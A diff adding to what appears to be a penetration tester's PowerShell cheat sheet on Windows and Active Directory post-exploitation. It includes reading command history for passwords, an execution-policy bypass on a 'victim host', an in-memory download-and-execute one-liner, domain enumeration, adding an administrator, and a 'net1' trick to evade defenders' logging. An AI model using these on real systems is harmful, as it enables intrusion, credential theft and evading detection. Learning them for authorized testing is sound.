@@ -43,6 +43,9 @@ New-Item -ItemType Directory nameOfDirectory
 history
 Get-history
 
+# With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.
+Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt	
+
 # Browse the command history
 CTRL-R
 
@@ -103,10 +106,36 @@ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/
 ### System, users, permissions
 
 ```powershell
+# Prints all the information about the system
+systeminfo
+
+# Prints the PC's Name
+hostname
+
+# Am I alone
+qwinsta
+
 # Display Powershell relevant Powershell version information
 echo $PSVersion
 echo ~PSVersionTable
 
+# Prints out the OS version and revision level
+[System.Environment]::OSVersion.Version	
+
+# Prints the patches and hotfixes applied to the host
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+# Displays a list of environment variables for the current session (ran from CMD-prompt)
+set	
+
+# Return environment values such as key paths, users, computer information, etc.
+Get-ChildItem Env: | ft Key,Value	
+
+# Displays the domain name to which the host belongs (ran from CMD-prompt)
+echo %USERDOMAIN%	
+
+# Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)
+echo %logonserver%	
 
 #You can tell if PowerShell is running with administrator privileges (a.k.a “elevated” rights) with the following snippet:
 [Security.Principal.WindowsIdentity]::GetCurrent().Groups -contains 'S-1-5-32-544'
@@ -150,6 +179,17 @@ mimikatz.exe sekurlsa::pth /domain:htb.local /user:jackie.may /rc4:ad11e823e1638
 
 
 ### Policies and antivirus
+
+```powershell
+# Lists available modules loaded for use.
+Get-Module	
+
+#  print the execution policy settings for each scope on a host.
+Get-ExecutionPolicy -List	
+
+#This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.
+Set-ExecutionPolicy Bypass -Scope Process	
+```
 
  [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft's application whitelisting solution and gives system administrators control over which applications and files users can run.
 
@@ -198,6 +238,103 @@ $password = 'Password123'
 $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
 New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred
+```
+
+### Transfer files
+
+
+```powershell
+# This is a quick and easy way to download a file from the web using PowerShell and call it from memory.
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"	
+```
+
+
+### Network Information
+
+```powershell
+# Lists all known hosts stored in the arp table.
+arp -a
+
+# Prints out adapter settings for the host. We can figure out the network segment from here.
+ipconfig /all	
+
+# Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.
+route print
+
+# Displays the status of the host's firewall. We can determine if it is active and filtering traffic.
+netsh advfirewall show allprofiles
+```
+
+
+## The net commands
+
+**Evasion trick**: If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing `net1` instead of `net` will execute the same functions without the potential trigger from the net string.
+
+#### Net.exe commands
+
+```powershell
+# Information about password requirements
+net accounts	
+
+# Password and lockout policy
+net accounts /domain
+
+# Information about domain groups
+net group /domain	
+
+# List users with domain admin privileges
+net group "Domain Admins" /domain
+
+# List of PCs connected to the domain
+net group "domain computers" /domain	
+
+# List PC accounts of domains controllers
+net group "Domain Controllers" /domain	
+
+# User that belongs to the group
+net group <domain_group_name> /domain	
+
+# List of domain groups
+net groups /domain	
+
+# All available groups
+net localgroup	
+
+# List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)
+net localgroup administrators /domain	
+
+# Information about a group (admins)
+net localgroup Administrators	
+
+# Add user to administrators
+net localgroup administrators [username] /add	
+
+# Check current shares
+net share	
+
+# Get information about a user within the domain
+net user <ACCOUNT_NAME> /domain	
+
+# List all users of the domain
+net user /domain	
+
+# Information about the current user
+net user %username%	
+
+# Mount the share locally
+net use x: \computer\share	
+
+# Get a list of computers
+net view	
+
+# 	Shares on the domains
+net view /all /domain[:domainname]
+
+# List shares of a computer
+net view \computer /ALL	
+
+# List of PCs of the domain
+net view /domain	
 ```
 
 
